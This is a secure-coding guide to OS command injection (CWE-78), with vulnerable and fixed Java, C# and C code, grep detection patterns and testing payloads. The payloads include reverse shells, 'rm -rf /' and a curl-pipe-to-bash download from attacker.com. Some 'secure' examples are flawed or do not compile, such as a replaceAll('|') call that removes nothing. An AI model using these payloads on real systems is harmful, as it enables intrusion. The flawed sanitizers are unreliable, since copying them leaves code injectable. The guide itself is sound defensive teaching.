# OS Command Injection (CWE-78)

**Severity**: 🔴 CRITICAL
**Category**: Input Validation & Representation
**OWASP Top 10**: A03:2021 – Injection

---

## Overview

### Attack Description

OS Command Injection occurs when user input that has not undergone proper validation is used as part or all of an operating system command. This can lead to unintended system commands being executed, resulting in unauthorized privilege changes or adverse effects on system operation. Many programs construct system commands using external input such as command-line parameters or stream input. However, since these external input strings cannot be trusted, failure to properly sanitize them allows attackers to execute arbitrary commands.

### Impact

**Potential consequences:**
- Arbitrary command execution on the server
- Full system compromise
- Data theft or destruction
- Privilege escalation
- Malware installation
- Server used as attack platform

---

## Security Measures

### Key Principles

Configure the operating program so that system commands are not passed from the web interface to the server, and do not use externally transmitted values as internal system commands without validation. When commands need to be generated or selected based on external input, predefine the necessary values and select from them based on external input.

**Primary Defenses:**

1. **Avoid System Commands**
   - Use language/framework APIs instead of shell commands
   - Example: Use Java File I/O instead of `Runtime.exec("rm file")`
   - Avoid `Runtime.exec()`, `ProcessBuilder`, `system()`, `exec()`

2. **Whitelist Validation**
   - If system commands unavoidable, use strict whitelist
   - Only allow predefined commands from a safe list
   - Reject any input containing shell metacharacters

3. **Input Sanitization**
   - Remove or escape dangerous characters: `| & ; $ < > \` \n ( )`
   - Validate input format matches expected pattern
   - Use regex to filter out special characters

4. **Use Safe APIs**
   - `ProcessBuilder` with separate arguments (no shell expansion)
   - Avoid string concatenation for commands
   - Never pass user input directly to shell

---

## Code Examples

### Attack Scenario

The following example executes a program using `Runtime.getRuntime().exec()`, and externally passed argument values are used to construct the command. However, since the program does not restrict which programs can be executed, an external attacker can execute any available program.

**Example Attack:**
```bash
# User input: date
# Command executed: cat date

# Attacker input: /etc/passwd; cat /etc/shadow
# Commands executed: cat /etc/passwd; cat /etc/shadow
```

---

### ❌ Vulnerable Code

#### Java - Runtime.exec() with User Input

```java
public static void main(String args[]) throws IOException {
    // The program does not restrict which programs can be executed, so any program
    // passed as a parameter can be run
    String cmd = args[0];
    Process ps = null;
    try {
        ps = Runtime.getRuntime().exec(cmd);
        ...
```

**Problem:**
- User input (`args[0]`) directly passed to `exec()`
- No validation or sanitization
- Attacker can inject shell metacharacters
- Can execute arbitrary commands

**Attack Examples:**
```java
// Normal use: java Program "cat file.txt"
// Attack 1: java Program "cat file.txt; rm -rf /"
// Attack 2: java Program "cat /etc/passwd"
// Attack 3: java Program "nc attacker.com 4444 -e /bin/bash"
```

#### Java - String Concatenation with User Input

```java
// Using externally received values without validation is unsafe
String date = request.getParameter("date");
String command = new String("cmd.exe /c backuplog.bat");
Runtime.getRuntime().exec(command + date);
```

**Problem:** User input concatenated to command string without validation.

---

### ✅ Secure Code

#### Java - Whitelist Validation

```java
public static void main(String args[]) throws IOException {
    // Restrict allowed external input to only the programs notepad and calculator
    List<String> allowedCommands = new ArrayList<String>();
    allowedCommands.add("notepad");
    allowedCommands.add("calc");

    String cmd = args[0];
    if (!allowedCommands.contains(cmd)) {
        System.err.println("Command not allowed.");
        return;
    }

    Process ps = null;
    try {
        ps = Runtime.getRuntime().exec(cmd);
        ......
```

**Security Features:**
1. Whitelist of allowed commands
2. Input validation before execution
3. Error handling for invalid commands
4. No user-controlled command parameters

#### Java - Input Sanitization

```java
String date = request.getParameter("date");
String command = new String("cmd.exe /c backuplog.bat");
// Validate externally received values through filtering or use them carefully
date = date.replaceAll("|", "");
date = date.replaceAll("&", "");
date = date.replaceAll("&", "");
date = date.replaceAll(";", "");
date = date.replaceAll("\"", "");
date = date.replaceAll("'", "");
Runtime.getRuntime().exec(command + date);
```

**Filters applied:**
- Remove pipe `|` (command chaining)
- Remove ampersand `&` (background execution)
- Remove semicolon `;` (command separator)
- Remove quotes (command injection)

**Note:** Sanitization is fragile - whitelist approach is better!

---

### ✅ Best Practice - Avoid Shell Commands Entirely

```java
// Instead of: Runtime.exec("rm " + filename)
// Use Java APIs:
File file = new File(filename);
if (file.exists()) {
    file.delete();
}

// Instead of: Runtime.exec("mkdir " + dirname)
// Use Java APIs:
File dir = new File(dirname);
dir.mkdir();

// Instead of: Runtime.exec("cat " + filename)
// Use Java APIs:
try (BufferedReader reader = new BufferedReader(new FileReader(filename))) {
    String line;
    while ((line = reader.readLine()) != null) {
        System.out.println(line);
    }
}
```

**Why This Is Better:**
- No shell involved
- No command injection possible
- Type-safe, exception-based error handling
- Platform-independent

---

### ✅ Java - ProcessBuilder with Safe Arguments

```java
// If you must execute external commands, use ProcessBuilder
String userFile = request.getParameter("file");

// Validate filename first
if (!userFile.matches("[a-zA-Z0-9._-]+")) {
    throw new IllegalArgumentException("Invalid filename");
}

// Use ProcessBuilder with separate arguments (no shell expansion)
ProcessBuilder pb = new ProcessBuilder("cat", "/safe/directory/" + userFile);
pb.redirectErrorStream(true);
Process process = pb.start();

try (BufferedReader reader = new BufferedReader(
        new InputStreamReader(process.getInputStream()))) {
    String line;
    while ((line = reader.readLine()) != null) {
        System.out.println(line);
    }
}
```

**Security Features:**
1. Input validation (whitelist characters)
2. ProcessBuilder with separate arguments (no shell expansion)
3. Hardcoded safe directory prefix
4. No user-controlled command name

---

### C# Example

#### ❌ Vulnerable C#

```csharp
// External input value specifies the filename of the process to be executed
string fileName = PgmTextBox.Text;
ProcessStartInfo proStartInfo = new ProcessStartInfo();
proStartInfo.FileName = fileName;
Process.Start(proStartInfo);
```

#### ✅ Secure C# with Whitelist

```csharp
string fileName = PgmTextBox.Text;
// External input values must be validated using regex or similar methods
if (Regex.IsMatch(fileName, "properRegexHere"))
{
    ProcessStartInfo proStartInfo = new ProcessStartInfo();
    proStartInfo.FileName = fileName;
    Process.Start(proStartInfo);
}
```

---

### C Example

#### ❌ Vulnerable C

```c
int main(int argc, char* argv[]) {
    char cmd[CMD_LENGTH];

    if (argc < 1) {
        // error
    }
    // Constructing a command from external input values
    cmd_data = argv[1];
    snprintf(cmd, CMD_LENGTH, "cat %s", cmd_data);
    system(cmd);
    ......
}
```

**Problem:** `system()` executes command in shell, allowing injection.

#### ✅ Secure C with Whitelist Validation

```c
int main(int argc, char* argv[]) {
    char cmd[CMD_LENGTH];
    int len = 0;

    if (argc < 1) {
        // error
    }

    // Constructing a command from external input values
    cmd_data = argv[1];
    len = strlen(cmd_data);
    for (int i = 0; i < len; i++) {
        if (cmd_data[i] == '|' || cmd_data[i] == '&' ||
            cmd_data[i] == ';' || cmd_data[i] == ':' ||
            cmd_data[i] == ')' {
            // Dangerous special characters or file redirect characters detected
            // - unsafe
            return -1;
        }
    }

    snprintf(cmd, CMD_LENGTH, "cat %s", cmd_data);
    system(cmd);
    ......
}
```

**Security Features:**
- Character-by-character validation
- Filters dangerous metacharacters: `| & ; : )`
- Rejects input with shell special characters

---

## References

### CWE (Common Weakness Enumeration)

① **CWE-78: OS Command Injection**
   MITRE, http://cwe.mitre.org/data/definitions/78.html

### CERT

② **Sanitize untrusted data passed to the Runtime.exec() method**
   CERT, http://www.securecoding.cert.org/confluence/display/java/IDS07-J.+Sanitize +untrusted+data+passed+to+the+Runtime.exec()+method?focusedCommentId=64651588#comment-64651588

③ **Do not call system()**
   CERT, http://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=2130132

### OWASP

④ **Reviewing Code for OS Injection**
   OWASP, https://www.owasp.org/index.php/Reviewing_Code_for_OS_Injection

---

## 🔍 Detection Patterns (Grep/Search)

```bash
# Find Runtime.exec usage
grep -r "Runtime.*exec" .
grep -r "ProcessBuilder" .

# Find system() calls in C
grep -r "system(" *.c
grep -r "popen(" *.c

# Find Process.Start in C#
grep -r "Process.Start" *.cs
grep -r "ProcessStartInfo" *.cs

# Find command execution with user input
grep -r "exec.*request\\.getParameter" .
grep -r "exec.*args\\[" .
```

---

## ✅ Security Checklist

- [ ] No use of `Runtime.exec()` with user input
- [ ] No use of `system()`, `popen()` in C/C++
- [ ] If commands needed, whitelist validation applied
- [ ] Shell metacharacters filtered: `| & ; $ < > \` \n ( )`
- [ ] Use Java/C# APIs instead of shell commands where possible
- [ ] `ProcessBuilder` used with separate arguments (not command strings)
- [ ] Never concatenate user input into command strings
- [ ] Input validated against strict regex pattern
- [ ] Least privilege principle applied to executed processes
- [ ] Error messages don't leak system information

---

## 🎯 Dangerous Shell Metacharacters

### Unix/Linux
```
|    Pipe output to another command
&    Run command in background / command separator
;    Command separator
$    Variable expansion
<>   Input/output redirection
`    Command substitution (backticks)
\n   Newline (command separator)
()   Subshell execution
```

### Windows
```
|    Pipe output to another command
&    Command separator
;    Command separator (in some contexts)
<>   Input/output redirection
%    Variable expansion
^    Escape character
```

### Complete Filter List
```java
public String sanitizeForCommand(String input) {
    // Remove ALL shell metacharacters
    return input.replaceAll("[|&;$<>`\\n()\\[\\]{}\\\\\"']", "");
}
```

---

## 💡 Framework-Specific Solutions

### Java - Use Native APIs

```java
// DON'T: Execute shell commands
Runtime.exec("ls -la " + directory);

// DO: Use Files API
try (Stream<Path> files = Files.list(Paths.get(directory))) {
    files.forEach(System.out::println);
}
```

### Java - ProcessBuilder Safe Usage

```java
// DON'T: Single command string
ProcessBuilder pb = new ProcessBuilder("sh", "-c", "cat " + userInput);

// DO: Separate arguments (no shell interpretation)
ProcessBuilder pb = new ProcessBuilder("cat", sanitizedPath);
```

### C - Use Safer Functions

```c
// DON'T: system() with user input
system("cat " + filename);

// DO: execve() with argument array
char *args[] = {"cat", validated_filename, NULL};
execve("/bin/cat", args, NULL);
```

---

## 🚨 Common Mistakes

1. **Incomplete Filtering**
   ```java
   // DON'T: Forget to filter all metacharacters
   input.replaceAll(";", ""); // Still vulnerable to |, &, etc.
   ```

2. **Blacklist Instead of Whitelist**
   ```java
   // DON'T: Try to block everything bad
   if (!input.contains(";") && !input.contains("|")) // Incomplete!

   // DO: Only allow known good
   if (input.matches("[a-zA-Z0-9._-]+")) // Much safer
   ```

3. **Trusting "Internal" Data**
   ```java
   // DON'T: Assume database data is safe
   String cmd = dbResult.getString("command");
   Runtime.exec(cmd); // Database could be compromised!
   ```

4. **Using Shell When Not Needed**
   ```java
   // DON'T: Shell for simple operations
   Runtime.exec("rm " + file);

   // DO: Use Java APIs
   new File(file).delete();
   ```

---

## 🔬 Testing for Command Injection

### Basic Payloads
```bash
; ls
| cat /etc/passwd
& whoami
$(whoami)
`whoami`
\n/bin/ls
```

### Advanced Payloads
```bash
; ping -c 10 attacker.com     # Time-based detection
| nc attacker.com 4444         # Reverse shell
& curl http://attacker.com/shell.sh | bash   # Download and execute
```

### Tools
- **Commix**: Automated command injection testing
- **Burp Suite**: Manual testing with payloads
- **OWASP ZAP**: Automated scanning

---

## 💡 Best Practices Summary

1. **Never use shell commands with user input** - Use language APIs instead
2. **If unavoidable, use whitelist validation** - Only allow predefined safe commands
3. **Use ProcessBuilder with separate arguments** - Prevents shell expansion
4. **Filter all shell metacharacters** - Or better, use whitelist of safe characters
5. **Apply principle of least privilege** - Run with minimal required permissions
6. **Log all command executions** - For security monitoring and audit

---

**Avoid OS commands - Use language native APIs instead!**
